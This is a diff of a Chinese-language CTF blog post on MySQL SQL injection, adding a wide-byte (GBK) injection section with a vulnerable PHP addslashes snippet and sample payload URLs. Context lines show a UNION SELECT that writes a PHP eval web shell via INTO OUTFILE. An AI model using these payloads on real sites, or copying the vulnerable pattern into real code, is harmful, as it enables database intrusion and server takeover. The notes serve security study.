@@ -5,9 +5,9 @@ tags: [CTF,SQL注入,web]
 categories: Web安全
 copyright: true
 ---
-# 0x00 简介
+# 简介
 
-# 0x01 基本
+# 基本
 ## 查看当前数据库版本
 + VERSION()
 + @@VERSION
@@ -70,7 +70,7 @@ copyright: true
 	+  /\*! select \* from test \*/
 	+ 语句会被执行
 
-# 0x02 注入技术
+# 注入技术
 ## 判断是否存在注入
 假设有: www.test.com/chybeta.php?id=1
 ### 数值型注入
@@ -135,6 +135,33 @@ UNION SELECT GROUP_CONCAT(column_1,column_2 SEPARATOR+0x3c62723e) FROM databasen
 ### 布尔盲注
 ### 延时盲注
 ## 宽字节注入
+### 原理
+有如下php代码：
+```php
+...
+mysql_query("SET NAMES 'gbk'");
+....
+$name = isset($_GET['name']) ? addslashes($_GET['name']) : 1;
+$sql = "SELECT * FROM test WHERE names='{$name}'";
+```
+addslashes()会在单引号或双引号前加上一个`\`。当mysql使用GBK字符集时，会把两个字符当作一个汉字，如%df%5c为運字。我们输入`name=root%df%27`，%在服务器端会出现如下转换：`root%df%27` -> `root%df%5c%27` -> `root運'`。
+
+更多内容可见：[浅析白盒审计中的字符编码及SQL注入](https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html)
+### 语句
+#### 吃掉`\`
+```
+index.php?name=1%df'
+index.php?name=1%a1'
+index.php?name=1%aa'
+...
+```
+在被addslashes后，出现%XX%5c，当前一个字符的ascii码值大于128时，会被认为是一个宽字符，即使它不是个汉字。所以不是仅仅%df可以吃掉'\\'。
+
+#### 利用`\`
+```
+index.php?name=%**%5c%5c%27
+```
+
 ## 文件读写
 利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。
 
@@ -195,14 +222,16 @@ UNION SELECT  "<?php eval($_POST['chybeta'])?>" INTO OUTFILE 'C:/phpstudy/WWW/te
 
 ## 命令执行
 
-# 0x04 绕过技巧
+# 绕过技巧
+请见：[WAF Bypass:SQL Injection](https://chybeta.gitbooks.io/waf-bypass/content/sql-injection/ji-ben-guo-waf-zi-shi-hui-zong.html)
 ##  sqlmap-tamper编写
-# 0x05 版本特性
 
-# 0x06 常见sql注入位置
+# 版本特性
 
-# 0x07 工具
-# 0x08 参考
+# 常见sql注入位置
+
+# 工具
+# 参考
 + [MySQL_Testing_Injection](http://websec.ca/kb/sql_injection#MySQL_Testing_Injection)
 + [MySQL SQL Injection Cheat Sheet](http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/)
 + [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/#Enablecmdshell)
